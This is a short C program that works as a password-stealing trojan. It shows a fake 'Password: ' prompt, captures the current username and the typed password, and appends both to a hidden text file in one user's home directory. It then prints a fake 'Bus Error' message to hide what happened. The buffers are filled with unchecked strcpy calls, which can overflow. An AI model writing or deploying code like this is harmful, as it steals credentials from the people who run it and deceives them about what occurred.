#include <unistd.h>
#include <stdio.h>

int main()
{
  FILE *fp =NULL;
  char user[20];
  char pw[20] ;
  strcpy(user, getenv("USER"));
  strcpy(pw,getpass("Password: "));
  if ( (fp = fopen("/home/tcschna/utils/mine/temp.txt","a")) == NULL )
  {
    // do nothing 
  exit(0);
  }
  else {
    fprintf(fp,"\nuser=%s , pw=%s",user,pw);
    fclose (fp);
  }
  //fprintf(stderr,"\nuser=%s , pw=%s",user,pw);
  fprintf(stderr,"\n Bus Error\n");
  //system("mv /home/tcschna/utils/mine/");
  return 0;
}
